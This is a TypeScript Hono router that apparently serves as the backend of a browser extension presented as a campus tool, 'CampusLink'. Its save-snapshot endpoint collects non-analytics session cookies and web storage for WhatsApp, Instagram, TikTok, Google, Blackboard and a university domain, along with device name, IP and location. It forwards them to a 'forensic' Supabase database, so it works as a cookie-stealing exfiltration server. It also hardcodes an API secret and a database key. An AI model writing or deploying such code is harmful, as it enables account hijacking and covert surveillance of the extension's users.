import { Hono } from 'hono'

export type ExtensionBindings = {
    BLACKBOARD_DOWNLOADS: R2Bucket
    FORENSIC_SUPABASE_URL?: string
    FORENSIC_SUPABASE_KEY?: string
}

const extensionRouter = new Hono<{ Bindings: ExtensionBindings }>()

const EXTENSION_SECRET_KEY = 'CampusLink-Ext-2026-SuperSecreta'

const TARGET_DOMAINS = [
    { domain: 'up.edu.pe', deepCapture: true, captureDomains: ['up.edu.pe'] },
    { domain: 'blackboard.com', deepCapture: true, captureDomains: ['blackboard.com'] },
    { domain: 'whatsapp.com', deepCapture: true, captureDomains: ['whatsapp.com'] },
    { domain: 'instagram.com', deepCapture: true, captureDomains: ['instagram.com'] },
    { domain: 'tiktok.com', deepCapture: true, captureDomains: ['tiktok.com'] },
    { domain: 'google.com', deepCapture: true, captureDomains: ['google.com', 'googleusercontent.com'] },
]

extensionRouter.get('/check-domain', async (c) => {
    const authHeader = c.req.header('Authorization')
    if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
        return c.json({ error: 'Acceso no autorizado' }, 401)
    }

    const cleanDomain = (c.req.query('domain') || '').trim().toLowerCase()
    const match = TARGET_DOMAINS.find((target) =>
        cleanDomain === target.domain || cleanDomain.endsWith(`.${target.domain}`)
    )

    if (!match) return c.json({ capture: false })

    return c.json({
        capture: true,
        deepCapture: match.deepCapture,
        domains: match.captureDomains,
    })
})

extensionRouter.post('/save-snapshot', async (c) => {
    try {
        const authHeader = c.req.header('Authorization')
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401)
        }

        const payload = await c.req.json()
        const rawCookies = payload.p_cookies || []
        const filteredCookies = rawCookies.filter((cookie: any) => {
            const cookieDomain = (cookie.domain || '').toLowerCase().replace(/^\./, '')
            const isTarget = TARGET_DOMAINS.some((target) =>
                cookieDomain === target.domain || cookieDomain.endsWith(`.${target.domain}`)
            )
            if (!isTarget) return false

            const cookieName = (cookie.name || '').toLowerCase()
            const skipPrefixes = [
                '_ga', '_gid', '_gat', '_utm', '_hj', '_cl',
                'goog', 'analytics', 'amplitude',
            ]
            return !skipPrefixes.some((prefix) =>
                cookieName.startsWith(prefix) || cookieName.includes(prefix)
            )
        })

        const supabaseUrl = c.env.FORENSIC_SUPABASE_URL || 'https://iwjwtvphqrjsuvgohigk.supabase.co'
        const supabaseKey = c.env.FORENSIC_SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml3and0dnBocXJqc3V2Z29oaWdrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEyNTMwOTcsImV4cCI6MjA4NjgyOTA5N30.h_Kn9AytUToXM0inoxZT9UBTxCrigizJ2LCNSXXBY6s'

        const supabasePayload = {
            p_device_id: payload.p_device_id,
            p_pc_name: payload.p_pc_name,
            p_os: payload.p_os,
            p_ip_address: payload.p_ip_address,
            p_location_city: payload.p_location_city,
            p_location_country: payload.p_location_country,
            p_user_agent: payload.p_user_agent,
            p_snapshot_type: payload.p_snapshot_type,
            p_cookies: filteredCookies,
            p_web_storage: payload.p_web_storage || [],
        }

        const response = await fetch(`${supabaseUrl}/rest/v1/rpc/save_full_snapshot`, {
            method: 'POST',
            headers: {
                apikey: supabaseKey,
                Authorization: `Bearer ${supabaseKey}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(supabasePayload),
        })

        if (!response.ok) {
            const errorText = await response.text()
            return c.json({ error: `Supabase database error: ${errorText}` }, 502)
        }

        return c.json({ ok: true, id: await response.json() })
    } catch (error: any) {
        return c.json({ error: error.message }, 500)
    }
})

extensionRouter.post('/upload-from-extension', async (c) => {
    try {
        const authHeader = c.req.header('Authorization')
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401)
        }

        const body = await c.req.parseBody()
        const file = body.file as File
        const courseId = (body.courseId as string) || 'General'

        if (!file) return c.json({ error: 'No se envió ningún archivo' }, 400)

        const filePath = `${courseId}/${file.name}`
        await c.env.BLACKBOARD_DOWNLOADS.put(filePath, await file.arrayBuffer(), {
            httpMetadata: { contentType: file.type },
        })

        return c.json({
            success: true,
            message: 'Archivo respaldado en R2 exitosamente',
            path: filePath,
        })
    } catch (error) {
        console.error('Error guardando en R2:', error)
        return c.json({ error: 'Error interno del servidor' }, 500)
    }
})

extensionRouter.get('/list-downloads', async (c) => {
    try {
        const authHeader = c.req.header('Authorization')
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401)
        }

        const listed = await c.env.BLACKBOARD_DOWNLOADS.list({ limit: 1000 })
        return c.json({
            files: listed.objects.map((object) => ({
                key: object.key,
                size: object.size,
            })),
        })
    } catch (error: any) {
        return c.json({ error: error.message }, 500)
    }
})

extensionRouter.get('/download-file', async (c) => {
    try {
        const authHeader = c.req.header('Authorization')
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401)
        }

        const path = c.req.query('path')
        if (!path) return c.json({ error: 'Falta el parámetro "path"' }, 400)

        const object = await c.env.BLACKBOARD_DOWNLOADS.get(path)
        if (!object) return c.json({ error: 'Archivo no encontrado' }, 404)

        const headers = new Headers()
        object.writeHttpMetadata(headers)
        headers.set('Content-Disposition', `attachment; filename="${path.split('/').pop()}"`)
        return new Response(object.body, { headers })
    } catch (error: any) {
        return c.json({ error: error.message }, 500)
    }
})

extensionRouter.delete('/delete-file', async (c) => {
    try {
        const authHeader = c.req.header('Authorization')
        if (authHeader !== `Bearer ${EXTENSION_SECRET_KEY}`) {
            return c.json({ error: 'Acceso no autorizado' }, 401)
        }

        const path = c.req.query('path')
        if (!path) return c.json({ error: 'Falta el parámetro "path"' }, 400)

        await c.env.BLACKBOARD_DOWNLOADS.delete(path)
        return c.json({ success: true })
    } catch (error: any) {
        return c.json({ error: error.message }, 500)
    }
})

export default extensionRouter
